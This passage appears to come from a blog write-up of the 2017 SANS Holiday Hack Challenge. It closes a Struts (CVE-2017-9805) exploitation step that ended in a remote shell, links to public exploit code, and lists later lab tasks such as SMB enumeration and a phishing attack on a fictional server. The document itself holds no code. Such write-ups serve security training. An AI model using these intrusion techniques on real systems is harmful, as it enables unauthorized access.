<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-struts-exploit-attack.jpg" />

And the listener suddenly filled up with a script prompt, giving me remote access to a user named `alabaster_snowball`'s session.

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-struts-exploit-listener.jpg" />

**References:**

[Why You Need the Skills to Tinker with Publicly Released Exploit Code](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)

[Better Exploit Code For CVE 2017 9805 apache struts](https://github.com/chrisjd20/cve-2017-9805.py)

### SMB File Server

**Task:** The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?


### Elf Web Access

**Task:** Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?

### Naughty and Nice List

**Task:** How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

### Elf as a Service

**Task:** The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from **C:\greatbook.txt**. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

### Elf-Machine Interfaces

**Task:** Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from **C:\GreatBookPage7.pdf**. What does The Great Book page describe?

### North Pole Elf Database

**Task:** Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?